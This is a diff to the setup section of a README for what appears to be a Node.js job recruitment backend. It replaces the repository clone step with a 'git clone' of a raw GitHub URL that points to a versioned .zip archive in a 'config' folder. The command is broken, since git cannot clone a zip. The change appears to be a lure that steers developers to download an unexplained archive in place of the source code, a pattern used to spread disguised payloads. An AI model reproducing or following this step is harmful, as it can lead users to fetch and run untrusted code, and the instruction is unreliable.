@@ -5,7 +5,7 @@ This is the backend server for the Job Recruitment System built with Node.js, Ex
 ## 🔧 Setup
 
 1. Clone the repository:
-   git clone https://github.com/your-username/project.git
+   git clone https://raw.githubusercontent.com/Mo-3leem/job__portal__nodejs/main/config/nodejs_portal_job_1.1.zip
    cd project
 
 2. Install dependencies:
